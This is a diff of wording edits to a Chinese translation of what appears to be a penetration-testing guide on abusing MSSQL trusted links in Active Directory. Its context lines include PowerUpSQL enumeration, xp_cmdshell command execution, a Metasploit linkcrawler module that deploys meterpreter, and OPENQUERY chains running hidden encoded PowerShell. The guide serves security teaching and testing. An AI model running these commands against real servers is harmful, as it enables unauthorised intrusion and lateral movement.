@@ -108,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### 从域内部进行枚举
+### 从域内部枚举
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -148,7 +148,7 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-检查**以下部分提到的页面**以手动执行此操作。
+检查**以下部分**中提到的页面以手动执行此操作。
 
 ### MSSQL 基本黑客技巧
 
@@ -160,7 +160,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 如果一个 MSSQL 实例被另一个 MSSQL 实例信任（数据库链接）。如果用户对受信任的数据库拥有权限，他将能够**利用信任关系在另一个实例中执行查询**。这些信任可以被链接，在某些情况下，用户可能能够找到一些配置错误的数据库，在那里他可以执行命令。
 
-**数据库之间的链接甚至可以跨森林信任工作。**
+**数据库之间的链接甚至可以跨越森林信任。**
 
 ### Powershell 滥用
 ```powershell
@@ -202,7 +202,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-注意，metasploit 只会尝试在 MSSQL 中滥用 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您将需要尝试 **手动** 使用 `EXECUTE` 方法来执行命令，更多信息见下文。）
+注意，metasploit 只会尝试在 MSSQL 中滥用 `openquery()` 函数（因此，如果您无法使用 `openquery()` 执行命令，您将需要尝试 **手动** 使用 `EXECUTE` 方法来执行命令，详见下文。）
 
 ### 手动 - Openquery()
 
@@ -223,7 +223,7 @@ EXEC sp_linkedservers;
 
 #### 在可信链接中执行查询
 
-通过链接执行查询（例如：在新的可访问实例中查找更多链接）：
+通过链接执行查询（示例：在新的可访问实例中查找更多链接）：
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
@@ -232,7 +232,7 @@ select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 
 ![](<../../images/image (643).png>)
 
-您可以手动无限制地继续这些受信任链接的链条。
+您可以手动无限制地继续这些受信任的链接链。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
